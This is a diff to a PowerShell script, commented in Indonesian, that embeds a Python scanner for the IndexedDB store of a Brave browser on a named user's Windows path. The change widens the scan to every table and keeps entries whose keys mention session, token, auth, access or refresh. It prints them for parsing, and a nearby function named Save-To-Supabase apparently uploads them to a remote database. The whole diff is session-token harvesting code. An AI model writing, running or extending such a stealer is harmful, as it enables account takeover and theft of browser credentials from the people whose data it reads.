@@ -50,95 +50,124 @@ function Save-To-Supabase {
 }
 
 function Get-IndexedDBData {
-    Write-Host "[*] Memulai pembacaan IndexedDB..."
+    Write-Host "[*] Memulai pembacaan IndexedDB folder..."
     
-    $indexDbPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\IndexedDB"
+    # Path spesifik yang diminta user
+    $indexDbPath = "C:\Users\valskia\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\IndexedDB"
     
     if (-not (Test-Path $indexDbPath)) {
         Write-Host "[!] Folder IndexedDB tidak ditemukan di: $indexDbPath"
         return $null
     }
 
-    # Buat script Python sementara untuk membaca SQLite
+    # Script Python untuk membaca SQLite secara recursive
     $pythonScript = @"
 import sqlite3
 import os
 import base64
-import sys
+import json
 
-def read_indexed_db(db_path):
-    sessions_found = []
+def read_db_content(db_path):
+    results = []
     try:
         conn = sqlite3.connect(db_path)
         cursor = conn.cursor()
         
-        # Cek tabel yang ada
+        # Dapatkan nama semua tabel di file .db ini
         cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
         tables = [t[0] for t in cursor.fetchall()]
         
-        # IndexedDB biasanya menggunakan tabel 'items'
-        if 'items' not in tables:
-            return []
+        if not tables:
+            return results
 
-        # Ambil semua data dari tabel items
-        # Kita ambil semua karena kita tidak tahu strukturnya
-        cursor.execute("SELECT key, value FROM items;")
-        rows = cursor.fetchall()
-        
-        for row in rows:
-            key, value = row
+        # Kita coba baca tabel 'items', 'caches', atau tabel lain yang mungkin berisi data
+        # Biasanya IndexedDB menyimpan data di tabel bernama 'items'
+        tables_to_check = ['items', 'caches', 'data', 'meta']
+        # Tambahkan semua tabel yang ditemukan jika tidak ada yang cocok
+        if not any(t in tables_to_check for t in tables):
+            tables_to_check = tables
+
+        for table_name in tables_to_check:
+            if table_name not in tables:
+                continue
             
-            # Proses value jika bytes
-            if isinstance(value, bytes):
-                try:
-                    # Coba decode UTF-8 dulu
-                    decoded_val = value.decode('utf-8')
-                    # Cek jika ini JSON atau string biasa
-                    if '{' in decoded_val or '[' in decoded_val:
-                        try:
-                            import json
-                            json_obj = json.loads(decoded_val)
-                            # Jika JSON, kita simpan sebagai string JSON
-                            value_str = json.dumps(json_obj)
-                        except:
-                            value_str = decoded_val
+            try:
+                cursor.execute(f"SELECT * FROM {table_name};")
+                rows = cursor.fetchall()
+                
+                # Dapatkan kolom untuk mengetahui nama kolom key/value
+                # Biasanya kolom ke-1 adalah key, kolom ke-2 adalah value (atau sebaliknya)
+                # Tapi struktur IndexedDB bervariasi. Kita asumsikan kolom 2 adalah key dan 3 adalah value
+                # Jika tabel hanya 2 kolom, asumsikan kolom 1 = key, kolom 2 = value
+                
+                columns = [description[0] for description in cursor.description]
+                
+                for row in rows:
+                    # Identifikasi kolom Key dan Value berdasarkan nama atau urutan
+                    # Biasanya kolom bernama 'key' atau 'value', atau 'item_key', 'item_value'
+                    
+                    key_col = None
+                    val_col = None
+                    
+                    # Cari kolom yang mengandung 'key' atau 'value'
+                    key_candidates = [c for c in columns if 'key' in c.lower()]
+                    val_candidates = [c for c in columns if 'value' in c.lower() or 'data' in c.lower()]
+                    
+                    if key_candidates and val_candidates:
+                        key_col = columns.index(key_candidates[0])
+                        val_col = columns.index(val_candidates[0])
+                    elif len(columns) >= 2:
+                        # Fallback: asumsikan kolom 1 = key, kolom 2 = value
+                        key_col = 0
+                        val_col = 1
                     else:
-                        value_str = decoded_val
-                except UnicodeDecodeError:
-                    # Jika gagal decode, coba base64
-                    value_str = base64.b64encode(value).decode('utf-8')
-            else:
-                value_str = str(value)
+                        continue
 
-            # Cari keyword yang relevan
-            key_lower = key.lower()
-            if any(kw in key_lower for kw in ['session', 'sid', 'token', 'auth', 'access_token', 'refresh_token']):
-                sessions_found.append({
-                    'key': key,
-                    'value': value_str
-                })
+                    if key_col is not None and val_col is not None and len(row) > val_col:
+                        key = row[key_col]
+                        value = row[val_col]
+                        
+                        if isinstance(value, bytes):
+                            try:
+                                decoded = value.decode('utf-8')
+                                # Cek jika ini JSON
+                                if decoded.startswith('{') or decoded.startswith('['):
+                                    try:
+                                        decoded = json.dumps(json.loads(decoded))
+                                    except:
+                                        pass
+                                value = decoded
+                            except:
+                                value = base64.b64encode(value).decode('utf-8')
+                        
+                        # Simpan jika key mengandung kata kunci penting
+                        if key and any(kw in str(key).lower() for kw in ['session', 'sid', 'token', 'auth', 'access', 'refresh']):
+                            results.append({'key': str(key), 'value': str(value)})
+                            
+            except Exception as e:
+                pass
                 
         conn.close()
     except Exception as e:
-        pass # Abaikan error per file
+        pass
         
-    return sessions_found
+    return results
 
 # Scan semua file .db di folder IndexedDB
 index_db_path = r"$indexDbPath"
-all_sessions = []
+all_results = []
 
 for root, dirs, files in os.walk(index_db_path):
     for file in files:
         if file.endswith(".db"):
             db_path = os.path.join(root, file)
-            found = read_indexed_db(db_path)
+            found = read_db_content(db_path)
             if found:
-                all_sessions.extend(found)
+                all_results.extend(found)
 
-# Output ke stdout dalam format yang mudah diparsing oleh PowerShell
-for session in all_sessions:
-    print(f"SESSION_FOUND:{session['key']}:---{session['value']}")
+# Output untuk PowerShell
+for item in all_results:
+    print(f"FOUND:{item['key']}:---{item['value']}")
 "@
 
     $pythonScriptPath = "$env:TEMP\read_indexeddb.py"
@@ -150,7 +179,7 @@ for session in all_sessions:
         $sessionId = $null
         
         foreach ($line in $output) {
-            if ($line -match "^SESSION_FOUND:(.+?):---(.+)$") {
+            if ($line -match "^FOUND:(.+?):---(.+)$") {
                 $key = $Matches[1]
                 $value = $Matches[2]
                 
